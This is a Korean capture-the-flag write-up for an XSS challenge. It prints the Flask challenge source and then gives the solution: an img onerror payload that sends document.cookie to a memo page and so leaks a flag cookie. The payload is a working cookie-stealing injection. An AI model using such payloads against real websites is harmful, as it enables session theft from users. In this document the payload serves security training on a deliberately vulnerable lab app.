## 코드

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/vuln")
def vuln():
    return render_template("vuln.html")


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


app.run(host="0.0.0.0", port=8000)
```

## 풀이

xss-1에 비해 달라진 점은

```python
@app.route("/vuln")
def vuln():
    return render_template("vuln.html")

def vuln():
    param = request.args.get("param", "") # 이용자가 입력한 vuln 인자를 가져옴
    return param # 이용자의 입력값을 화면 상에 표시
```

단순 return에서 render_template으로 달라졌다는 점이다.
따라서 우리는 직접 스크립트를 넣어도 실행되지 않는다.

결국 XSS 필터를 우회해야 되고,
검색을 해보면 다양한 방법이 나온다.

<img src="abc.jpg" onerror="location.href = '/memo?memo=' + document.cookie">

이렇게 `<script>` 태그를 피해서 스크립트를 삽입할 수 있다.
이러면 abc.jpg가 없으므로 이를 불러오는데 에러가 나고, 에러가 날때 실행할 기능(onerror)을 지정해놨으므로
마찬가지로 memo에 document.cookie가 기록된다.


